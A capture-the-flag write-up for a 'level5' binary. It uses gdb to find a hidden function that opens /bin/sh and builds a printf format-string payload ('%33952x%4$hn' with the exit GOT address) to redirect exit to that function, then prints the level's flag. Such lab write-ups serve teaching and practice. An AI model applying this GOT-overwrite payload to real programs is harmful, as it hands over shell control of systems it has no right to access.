solution level5:

-> gdb level5

-> the main simply calls function "n"

-> we disassemble function n and we can observe the following:
- some space is allocated on the stack
- the function fills a buffer with a call to fgets
- next the printf method is called with the buffer passed as argument
- finally the exit method is called

-> by looking at the existing functions in the program with "i func", we notice another function called "o"

-> "o" simply calls the system method to open a new shell (/bin/sh) then calls exit

-> we need to find a way to call "o", and we know that we can exploit the printf method to modify the memory of our program

-> since the next and only instruction after printf is the call to exit, we are going to make that instruction call function "o" instead:
> (gdb) disass exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
...
The exit method makes a jump to address 0x08049838; this will be the address to replace.
The address of function "o" is 0x080484a4. Therefore we need to replace the last 2 bytes by 84a4, which is 33956 in decimal.

-> our buffer will contain:
- the address to replace -> \x38\x98\x04\x08
- our number minus the size of the address above : 33956 - 4 = 33952 -> %33952x
- the %n modifier, but only half of the address needs to be changed, so we'll use the size specifier 'h'. We also need to indicate the argument index, which is 4 -> %4$hn

> scp -P 2222 Ressources/run.sh level5@127.0.0.1:/tmp/

> bash /tmp/run.sh
> cat /tmp/buff - | ./level5
> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
